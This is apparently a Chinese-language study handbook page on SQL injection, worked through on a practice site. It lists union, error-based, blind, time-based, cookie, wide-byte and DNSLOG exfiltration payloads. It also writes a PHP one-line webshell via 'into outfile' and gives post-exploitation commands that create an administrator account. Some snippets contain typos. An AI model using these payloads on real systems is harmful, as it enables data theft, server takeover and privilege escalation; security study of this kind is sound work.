<p>在数据库中所有的id字段数据类型都是整数，但是在查询语句去查询的时候要求id等于一个<code>字符串</code>类型</p> <p>这个时候它会给我们的字符串进行强制类型转换。在这个过程中，如果输入的id是字母，则全部为0处理</p> <p>也就是假设<code>id=1dawdawdawdwafb</code>后面无论跟着什么，在强制转换后id都是1后面的会被忽略。这是一个规则不是漏洞。</p> <p>并且数据库还十分只能，可以直接在url栏来进行加减乘除。</p> <p>url的中文名是<strong>统一资源定位符</strong>他有着自己独特的编码，也就是url编码。而+号在这里面有着特殊的意义，也就是空格的意思</p> <p>也就是说在url栏中正常输入+号会被当作空格处理，如果想要使用+号必须使用url编码后的+，<code>%2b</code>才能执行+法</p> <p>还可以使用sleep函数来判断是否存在。</p> <p>用法就是直接输入sleep(10)也就是叫页面休眠10秒钟再返回数据。</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071705131.webp" alt="Img"></p> <p>可以看到页面正在加载。证明我们输入进去的字符被当成命令执行了，这就是显错注入</p> <h2 id="查询数据库字段"><a href="#查询数据库字段" class="header-anchor">#</a> 查询数据库字段</h2> <p>可以使用<code>order by</code>函数</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071715193.webp" alt="Img"></p> <p>这里输入order by 1有回显，证明该页面最有一个字段，那么再试试3.</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071716069.webp" alt="Img"></p> <p>这里报错了，说明他小于3个字段，那么再试试2.</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071716690.webp" alt="Img"></p> <p>有正常的回显，证明这个页面一共只有2个字段。</p> <h2 id="sql注入查询当前网页的数据库名"><a href="#sql注入查询当前网页的数据库名" class="header-anchor">#</a> sql注入查询当前网页的数据库名</h2> <p>函数是<code>database()</code></p> <p><span style="color:rgb(255, 76, 65);"><code>union</code>&gt;</span>要求前后两条SQL语句必须字段相同</p> <p>在这例题中的用法是这样</p> <p><code>?id=1 and 1=2 union select 1,database()</code> 回车</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071739026.webp" alt="Img"></p> <p>可以看到回显数据库名字了</p> <p><code>?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</code>查询当前数据库下的表名</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071741136.webp" alt="Img"></p> <p>在大部分情况下管理员账号密码都在admin表里</p> <p><code>?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin'</code></p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071942865.webp" alt="Img"></p> <p>这样我们得到了到第一个字段</p> <p>如果网页有多个字段的话可以引用limit函数。</p> <h2 id="sqlmap"><a href="#sqlmap" class="header-anchor">#</a> sqlmap</h2> <p>使用sqlmap可以一把梭，十分轻松的拿到库名</p> <p>不过sqlmap有分Windows平台的版本还有kali的sqlmap，个人更加建议使用kali，因为更方便使用起来也舒服</p> <p><code>sqlmap -u &quot;url&quot; --tables --purge</code>查看当前数据库版本以及字段</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130056038.webp" alt="Img"></p> <p>使用<code>sqlmap -u &quot;url&quot; --dbs</code>命令可以直接拿到数据名</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130053223.webp" alt="Img"></p> <p>这里附上一个<a href="https://www.cnblogs.com/hongfei/p/3872156.html" target="_blank" rel="noopener noreferrer">sqlmap使用手则<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="联合注入"><a href="#联合注入" class="header-anchor">#</a> 联合注入</h2> <p>联合查询语句是 <code>union select</code></p> <p>其原理是跟前面的语句拼接例如这样 <code>select * from admin union select user,password from admin</code></p> <p>这样才能实现联合查询并且联合查询的前后的字段必须保持一致</p> <h2 id="获取数据库的表名和字段名"><a href="#获取数据库的表名和字段名" class="header-anchor">#</a> 获取数据库的表名和字段名</h2> <p>通过每一个数据库都会自带的一个  <code>information_schema</code> 数据库来查询</p> <p>查询 <code>information_schema</code> 数据库下面的  <code>tables</code> 、 <code>conlumns</code> 两个表来获得</p> <h4 id="tables表里存储的是当前数据库中所有表的信息"><a href="#tables表里存储的是当前数据库中所有表的信息" class="header-anchor">#</a> tables表里存储的是当前数据库中所有表的信息</h4> <p><code>tables_name</code></p> <h4 id="columns表里存储的是当前数据库中的所有字段的信息"><a href="#columns表里存储的是当前数据库中的所有字段的信息" class="header-anchor">#</a> columns表里存储的是当前数据库中的所有字段的信息</h4> <p><code>columns_name</code></p> <p>还有一个表 <code>schema</code> 表中存储了所有数据库的信息</p> <p><code>schema_name</code></p> <h2 id="limit的作用"><a href="#limit的作用" class="header-anchor">#</a> limit的作用</h2> <p>limit 0,1  =&gt; 更多是用来分页但还有一种意思，就是从第一行取一条数据</p> <p>limit 1,1  从第二行取一条数据</p> <p>limit 1,2  从第二行取两条数据</p> <p>库&gt;表&gt;字段</p> <h2 id="post注入"><a href="#post注入" class="header-anchor">#</a> POST注入</h2> <p>POST注入也有两个关键条件</p> <ul><li>1、用户能控制输入</li> <li>2、原本程序要执行的代码，拼接了用户输入的数据。</li></ul> <p>POST注入的高危点：</p> <ul><li>登录框</li> <li>查询框</li> <li>等各种和数据库有交互的框</li></ul> <p>POST传参和GET类型没有什么区别。</p> <p>header注入都是在登录后才会产生，因为他只会记录用户，不会记录游客。</p> <p>插入的语句很可能没有回显</p> <p>1、盲注(比较复杂)、
2、报错注入(让数据报错，强行看返回)</p> <h2 id="head注入"><a href="#head注入" class="header-anchor">#</a> HEAD注入</h2> <p>安全和用户体验是对立的，用户体验比安全高，所以，不存在没有漏洞的程序。</p> <p>ip的获取是有讲究的分为</p> <p>代理</p> <ul><li>透明代理(目标知道你是谁)</li> <li>高匿代理(完全不知道是谁在访问)</li></ul> <p>而head注入一般是这几种方式</p> <ul><li>ip</li> <li>UA</li> <li>refer</li> <li>cookie</li></ul> <h2 id="updatexml函数"><a href="#updatexml函数" class="header-anchor">#</a> updatexml函数</h2> <p>updatexml()更新xml文档的函数</p> <p>语法：</p> <div class="language- extra-class"><pre class="language-text"><code>uodatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
</code></pre></div><blockquote><p>实际上这里去更新了xml文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后会因为不符合输入规则然后报错</p></blockquote> <p>但是报错的时候他其实已经执行了那个子查询代码！</p> <blockquote><p>0x7e是16进制，MSQL支持16进制，但是开头要写0x，0x7e是一个特殊符号，然后不符合路径规则报错</p></blockquote> <p>用法是<code>select updatexml(1,'!a',1)</code></p> <p>这样数据库就会找不到我要的这个东西，会看不懂<code>!a</code>是什么意思就会回显报错</p> <p><code>concat('!',database())</code>这行代码的意思就是将<code>!</code>和<code>database</code>的信息连接到一起</p> <h2 id="盲注"><a href="#盲注" class="header-anchor">#</a> 盲注</h2> <br> <p>盲注所对应的是显错注入，如果服务器关闭了错误回显，这样即使有报错也不会显示，你也不会知道</p> <p>所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。</p> <p>服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”。</p> <p>盲注又分为<code>布尔盲注</code>和<code>时间盲注</code></p> <br> <p><strong>布尔盲注</strong></p> <ul><li>布尔很明显Ture跟False，也就是说他只会根据你的注入信息返回Ture和False，也就没有了之前的报错信息。</li></ul> <p><strong>时间盲注</strong></p> <ul><li>界面返回值只有一种，Ture无论输入任何值返回情况都会按照正常的来处理。加入特定的时间函数，通过查看web页面返回的时间来判断注入语句是否正确。</li></ul> <br> <center>盲注需要掌握的几个函数</center> <br> <table><thead><tr><th style="text-align:center;">函数名</th> <th style="text-align:center;">作用</th></tr></thead> <tbody><tr><td style="text-align:center;">length()</td> <td style="text-align:center;">返回字符串的长度</td></tr> <tr><td style="text-align:center;">substr()</td> <td style="text-align:center;">截取字符串(语法:SUBSTR(str,pos,len); )</td></tr> <tr><td style="text-align:center;">ascii()</td> <td style="text-align:center;">返回字符的ascii码（将字符变成数字wei）</td></tr> <tr><td style="text-align:center;">sleep()</td> <td style="text-align:center;">将程序挂起一段时间n为n秒</td></tr> <tr><td style="text-align:center;">if(expr1,expr2,expr3)</td> <td style="text-align:center;">判断语句，如果第一个语句正确就执行第二个语句，如果错误就执行第三个语句</td></tr></tbody></table> <br> <p>盲注第一个考虑的就是字符串长度</p> <p><code>and length(database()) &gt;= n</code>通过这样的函数，不断的更改n的值，就可以判断数据库的库名长度</p> <p>这里依然以猫舍作为例子</p> <p>以为之前已经知道了猫舍的库名是maoshe并且长度为6所以可以更加直观的查看结果</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120035354.webp" alt="Img"></p> <br> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120036934.webp" alt="Img"></p> <p>可以看到当<code>length(database()) &gt; 6</code>时页面就不在出现回显。于是就可以知道他的库名长度为6</p> <p>知道库名的长度之后，就可以使用<code>and ascii(substr(database(),1,1)) &gt; n</code>来判断每一个字符对应的ASCII码值，以此来得到库名</p> <p>而一个一个的手动去试字符，很显然这是一个非常耗费时间的事情</p> <p>所以可以使用工具burpsuite来进行跑包解放双手！</p> <p>这里依然以猫舍为例</p> <p>将参数改成<code>?id=1 and ascii(substr(database(),1,1))=1</code></p> <p>然后使用burpsuite进行拦截发送至<code>Intruder</code>模块中进行暴力破解</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120049126.webp" alt="Img"></p> <p>给我们要改变的值标记一下，设置一下从1开始跑到128(因为ASCII码最多127位)</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120049674.webp" alt="Img"></p> <p>跑完以后按照返回的长度来排序，不一样的肯定是有东西的。</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120053835.webp" alt="Img"></p> <p>这里可以看到当ASCII值=109的时候返回的长度不一样，109转换成字符串的值就是m。</p> <p>因为之前已经知道了库名是maoshe了所以可以，所以按照盲注的话，后面的5个字符也可以这样跑</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120056147.webp" alt="Img"></p> <p>回到原来选数据的地方，将箭头所指的1改为2，即可跑第二个数据库名。</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120057077.webp" alt="Img"></p> <p>通过同样的方法我们又得到了第数据库名字的第二个字符串对应的ASCII码</p> <p>后面的重复这些操作，直到第六个的时候就可以得到数据库的全名</p> <p>如果嫌弃速度慢的话其实burpsuite还支持两个数据一起跑</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120102341.webp" alt="Img"></p> <p>这样的话就可以一次性最多跑20个变量了</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120101616.webp" alt="Img"></p> <p>唯一需要注意的就是要在这里选择每个变量以什么方式跑，跑多大范围就行了</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120103952.webp" alt="Img"></p> <p>在我们知道数据库名的时候就可以开始跑表名了</p> <p><code>select table_name from information_schema.tables where table_schema=database() limit 0,1</code>使用这串命令就可以跑出他的表名了</p> <p>具体用法是<code>?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1</code></p> <h2 id="时间注入"><a href="#时间注入" class="header-anchor">#</a> 时间注入</h2> <p>使用时间注入的情况就是无论怎么输入，即使让他成功报错了也不存在报错回显的情况下</p> <p>可以使用函数<code>sleep(10)</code>来测试我输入的语句是否被当成代码执行</p> <p>如果有被当成代码执行则页面在刷新的时候会进入一个10秒的等待才能成功刷新</p> <p>这里可以搭配上前面所说的函数<code>if(expr1,expr2,expr3)</code></p> <p>这里用一个用法来解释</p> <table><thead><tr><th style="text-align:center;">expr1</th> <th style="text-align:center;">expr2</th> <th style="text-align:center;">expr3</th></tr></thead> <tbody><tr><td style="text-align:center;">要判断的命令</td> <td style="text-align:center;">如果判断结果为Ture则执行这个模块的代码</td> <td style="text-align:center;">如果判断结果为False则执行这个地方的代码</td></tr></tbody></table> <p>例如：</p> <p><code>if(1=1,sleep(10),1)</code>这句话的意思就是如果1=1成立，则执行<code>sleep(10)</code>让服务器休息10秒，如果1=1不成立则输出1</p> <p>这是实际用法<code>&quot; and if(ascii(substr(database(),1,1))=1,sleep(100),1) --asd</code></p> <p>这样就可以在没有报错回显的情况下依然可以这样得到数据库名字</p> <p>注意在延时注入时尽量别把延时的只设的太大，这样对服务器的伤害是很大的，如果很多人都延时个几千秒，对服务器资源会造成很大的浪费！</p> <h2 id="宽字节注入"><a href="#宽字节注入" class="header-anchor">#</a> 宽字节注入</h2> <p>在实际的sql注入的过程中，如果语句没有被执行，不一定是受到了正则表达式的过滤，还有可能是遇见了魔术引号</p> <p>它可以将我输入的<code>'</code> <code>&quot;</code> <code>\</code>等用于闭合字符串的字符给使用转义字符转义掉，使无法将语句闭合</p> <p><strong>常见的应对方式有两种</strong></p> <ul><li><p>第一种是使用一些不需要出现单双引号的语句</p></li> <li><p>第二种就是宽字节注入</p></li> <li><p>第三种单引号用0x代替，双引号什么的也可以使用16进制字符代替</p></li></ul> <blockquote><p>如果要使用宽字节注入，一定要使用非utf-8编码</p></blockquote> <p>宽字节SQL注入主要是源于程序员设置的数据库编码为非英文编码，那么就有可能产生宽字节注入</p> <p>例如说 MySQL的编码设置为了SET NAMES 'gbk'或是SET character_set_client = gbk,这样的配置会引发编码转换从而导致的注入漏洞</p> <blockquote><p>宽字节SQL注入就是php发送请求到MySQL时使用了语句SET NAMES 'gbk'或是SET character_set_client = gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节的注入。</p></blockquote> <p>sql注入的方法选用是灵活的，遇见魔术引号无法闭合的时候不一定一定要使用宽字节注入，应当结合其他方法例如HEAD注入权衡之后选择一个最轻松的</p> <p>在一般情况下POST传参会进行一次编码、后端会进行一次解码</p> <p>%df =&gt; %25df =&gt; %df =&gt;字符串的%df</p> <p>GET传参，url看到了%xx，他不会取管</p> <h2 id="xff-and-refer"><a href="#xff-and-refer" class="header-anchor">#</a> XFF and Refer</h2> <p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项</p> <p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p> <p>并且这两个是可以伪造的</p> <p>直接在请求包上添加</p> <p><code>X-Forwarded-For: 123.123.123.123</code></p> <p><code>Referer: https://XXXXX</code></p> <p>就行了</p> <h2 id="access注入-cookie注入"><a href="#access注入-cookie注入" class="header-anchor">#</a> Access注入—— Cookie注入</h2> <p>Access =&gt; 数据库的一种</p> <p>POST注入其实是传参的一种</p> <p>Cookie注入 =&gt; 特殊的传参方式产生的注入</p> <p>Access MySQL mssql(sql server) Oracle</p> <p>在浏览器中Cookie类似与现实中的门禁卡的意思。</p> <blockquote><p>Cookie就是代表你身份的一串字符串，网站根据Cookie来识别你是谁。如果你获取了管理员的Cookie，
你可以无需密码直接登录管理员账户。</p></blockquote> <ul><li>为什么Cookie可以注入？</li></ul> <blockquote><p>在动态脚本语言中存在超全局变量可以获取多种传参方式
很多时候开发在开发的时候为了考虑到多种接受参数，在接受参数的时候都是用多种解释传参的方法</p></blockquote> <p>例如:</p> <p>php中的<code>$_REQUESET[]</code>可以获取<code>POST</code>|<code>GET</code>|<code>COOKIE</code>传参</p> <p><strong>注：php5.4以上版本就不会接受Cookie传参了</strong></p> <p>如果开发使用了<code>$_REQUESET[]</code>来接受参数。然后我们的<code>GET</code>和<code>POST</code>传参被Waf拦截了怎么办》
或许Waf没有对<code>Cookie</code>进行检测。使用<code>Cookie</code>进行传参就可以绕过检测机制。</p> <p><strong>设置Cookie</strong></p> <ul><li>1、在浏览器中通过按F12来进行设置</li> <li>2、抓包直接修改</li> <li>3、浏览器有的插件也可以设置Cookie</li> <li>浏览器自带的js进行设置</li> <li>document.cookie是查看当前id</li> <li>document.cookie=是赋值</li></ul> <h3 id="使用cookie传参"><a href="#使用cookie传参" class="header-anchor">#</a> 使用Cookie传参</h3> <p>在浏览器中有时会将and之类的sql语句给屏蔽了</p> <p>所以有拦截就得绕过</p> <ul><li>不让他检测到</li> <li>规避规则</li></ul> <p>它可以接受Cookie传参并且拼接进数据库。Cookie很多时候都需要URL编码</p> <p>Access是很老的数据库 =&gt; 他不是数据库只是表的集合，他不存在库，只有表和字段</p> <p>select 1,2,3,4,5,6,7,8,9 =&gt; MySQL</p> <p>在Access数据库中可以使用and exists(select*from 表名)来查询</p> <p>什么网站存在Cookie注入</p> <ul><li>1、ASP的站点存在肯能性极高</li> <li>PHP版本低于5.3版本的可能性极高</li></ul> <p>不要陷入思维误区</p> <br> <h2 id="偏移注入"><a href="#偏移注入" class="header-anchor">#</a> 偏移注入</h2> <p>爆破其实就是使用字典一个一个的去试，如果遇上一些很奇葩的表名基本上就是无解了</p> <p>偏移注入其实叫<code>位移注入</code></p> <p>字段名.表.字段 =&gt; 选择x库中的x字段</p> <p><code>select *from admin</code> =&gt; <code>select id, uesername, password from admin</code></p> <p><code>select admin.* from admin</code> =&gt;</p> <p>admin.* 代表了admin表里的所有字段</p> <p>所以表名.* = &gt; 表里的所有字段</p> <p><code>select*from news where id=1 union select admin.* from admin</code></p> <p>union =&gt; 要求前后两条执行的SQL语句字段数必须相同</p> <p>针对不同条件是要用不同的方法
1、知道表名
2、注入点的字段数要大于你想要查询的字段数</p> <p>一个网站不可能只存在一个漏洞，只要是在同一个网站就肯定会有相似的漏洞</p> <h2 id="mysql注入-dns注入"><a href="#mysql注入-dns注入" class="header-anchor">#</a> MySQL注入-DNS注入</h2> <p>大部分电脑在工作时会产生日志，而DNS注入的原理就是利用这个日志</p> <p>所以我们要满足以下条件</p> <ul><li>我们要MySQL能访问我们指定的东西</li> <li>我们要看到日志</li></ul> <p>DNSLOG的使用场景也是在不知道库名的情况下，让目标机器发起一个网络请求，比如</p> <p><code>select database()</code>.baidu.com</p> <p><code>库名.baodu.com</code></p> <p><code>load_file</code>可以读取文件，读取本地和远程的文件</p> <p>用法是<code>select load_file('绝对路径'):</code></p> <p>load_file()在MySQL中是默认不开启的，通常需要通过特殊的配置</p> <p>需要在MySQL的配置文件里加一句<code>secure_flie_priv=</code></p> <p>读取远程文件的方法是利用Windows上的服务(文件共享服务)，“网上邻居”、共享文件</p> <p>这里要引出一个叫做UNC路径的概念</p> <p>UNC路径 通用命名规则，也称为通用命名规范、通用命名约定</p> <p>UNC路径就是类似于\softer这样形式的网络路径。它符合\servername\sharename格式，其中servername是服务器名，sharename是共享资源名称。</p> <p>目录或文件的UNC名称可以包括共享名称下的目标路径，格式为：</p> <p><code>\\servername\sharename\directory\filename</code></p> <p>例如softer计算机的名为it168的共享文件夹，用UNC表示就是\softer\it168</p> <p>不过UNC路径也可以这样写//servername/sharename [推荐这样写]</p> <p>看到日志的方法是使用<a href="http://dnslog.cn/" target="_blank" rel="noopener noreferrer">Dnslog平台<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><code>select load_file(concat('//', database(), '.DNSLOG上请求的域名'))</code></p> <p>利用这个方法去查询表名</p> <p><code>select load_file(concat('//', (select table_name from infromation_schema.tables where table_schema=database() limit 0, 1),'.dnslog域名'));</code></p> <p>在实际网站进行sql注入时，会遇见一个东西</p> <p>网站防火墙 =&gt; Waf =&gt; 安全狗</p> <p>在大部分情况下 Waf =&gt; 商业非定制性Waf =&gt; 通用Waf</p> <p>也就是说大部分情况下网站的waf都是可以在网上直接下载到的，都有一个非常相似的模板和规则</p> <p>因为业务的体验性是最重要的所以waf都是有弹性的，因为有弹性才有绕过</p> <p>通用型waf中还有一个东西。</p> <p>index3.php/.txt =&gt; 特殊写法 Apache有一个规则，遇见某个文件，找不到的就会执行前一个文件，从右往左</p> <p>sqlmap没法跑dns</p> <p>当你可以DNS注入的时候，代表着你可以写文件load_flie()</p> <p>select 1 into outfile <code>'c:/web/1.txt'</code>这里必须是绝对路径</p> <p>所以这个时候我们就可以借用以下PHP的一句话木马了</p> <p><code>&lt;?php @eval($_REQUESET[9])?&gt;</code></p> <p>eval()函数， 将获取到的内容当作代码执行@是防止报错的</p> <h2 id="mysql注入-反弹注入"><a href="#mysql注入-反弹注入" class="header-anchor">#</a> MySQL注入——反弹注入</h2> <p>反弹注入 =&gt; 不需要修改配置就能用(实现将我查询到的数据，插入到其他的数据库)</p> <p><code>select *from admin</code>给插入到其他数据库里</p> <p>目标数据库是A，你在公网服务器上建立了一个B数据库</p> <p>将A得到的数据插入到B数据库里面</p> <p>条件：</p> <ul><li>MSSQL数据库</li> <li>有公网IP MSSQL数据库</li></ul> <p>堆叠注入：再注入的时候可以用;(;代表语句结束)<code>&lt;?php $a=1;$b=2;?&gt;</code></p> <p>插入东西，有标准、要求字段数类型相同</p> <p>反弹注入的条件：</p> <ul><li>1、有堆叠注入(MSSQL)</li> <li>2、目标有外网环境，</li></ul> <p>反弹注入的使用场景：</p> <blockquote><p>明明是sql的注入点却无法进行注入，注入工具的</p></blockquote> <h2 id="oracle注入-报错注入"><a href="#oracle注入-报错注入" class="header-anchor">#</a> Oracle注入——报错注入</h2> <p>Oracle——最黑心的数据库</p> <p>Oracle一般用于银行、证券部门他的能力确实比其他数据库更加强大。但现在大公司有逐渐趋于MySQL数据库的趋势。</p> <p>未来有可能会以MySQL为主</p> <p>Oracle里还有一个特殊的函数udal它是一个实表，但是它又像一个虚表，因为它里面只有一个x数据，更多的作用是用于满足语法需求</p> <div class="language- extra-class"><pre class="language-text"><code>select * from all_tables 查询出所有的表
select * from user_tables 查询出当前用户的表

select * from all_tab_columns 查询出所有字段
select * from user_tab_columns 查询出所有的字段

select * from v$version 查版本
rownum&lt;2 (限制查询返回的总行数为一条)

CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))
去查询关于主题的对应关键词，然后因为查询失败(应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出为查询到的错误从而爆出查询的内容)

and 1=ctxsys.drithsx.sn(1,(select banner from sys.v$version where rownum=1))-- 查询数据库版本
</code></pre></div><h2 id="使用sql获取webshell"><a href="#使用sql获取webshell" class="header-anchor">#</a> 使用SQL获取Webshell</h2> <p>Mysql导出函数：将数据库里的内容导出</p> <div class="language-sql extra-class"><pre class="language-sql"><code><span class="token keyword">into</span> <span class="token keyword">outfile</span>

<span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token comment"># 可以写16进制写入</span>
</code></pre></div><p>当知道绝对路径的时候，且可以导出权限开启的时候就可以拿到webshell</p> <p><code>id=1 union select 1,'&lt;?php eval($_REQUEST[8])?&gt;' into outfile 'c:/phpstudy/www/125.php'</code></p> <p>关键就在于如何获取这个绝对路径。简单的网站可以用这个方法：乱输入一些参数进去使其数据库报错，就会出现绝对路径。不过真实情况下基本不会遇见</p> <p>当获取到webshell以后的第一件事情就是查看当前用户的权限</p> <p>一共有两个步骤</p> <ul><li>先<code>whoami</code>查看当前用户</li> <li>再<code>net localgroup administrators</code></li></ul> <p>第二个步骤的作用是查看当前服务器内的管理员名单，如果里面没有whoami的用户。那就证明你获取的权限依旧不是最高，需要进行提权。</p> <p><a href="https://i.hacking8.com/tiquan" target="_blank" rel="noopener noreferrer">提权辅助网站<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>使用这个网站可以进行辅助提权，下面介绍一些Windows端的命令</p> <div class="language-windows extra-class"><pre class="language-text"><code>netstat -ano # 查看当前开放的所有端口

tasklist	 # 查看当前所有进程

systeminfo   # 查看当前系统的所有信息

net user name p@ssw0rd /all # 创建账号

net localgroup administrators name /add # 将某个用户添加到管理员权限
</code></pre></div></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/blog2/handbook/php.html" class="prev">
        PHP
      </a></span> <span class="next"><a href="/blog2/handbook/xss.html">
        XSS注入
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/blog2/assets/js/app.8931c98e.js" defer></script><script src="/blog2/assets/js/2.733019b2.js" defer></script><script src="/blog2/assets/js/23.da420023.js" defer></script>
  </body>
</html>
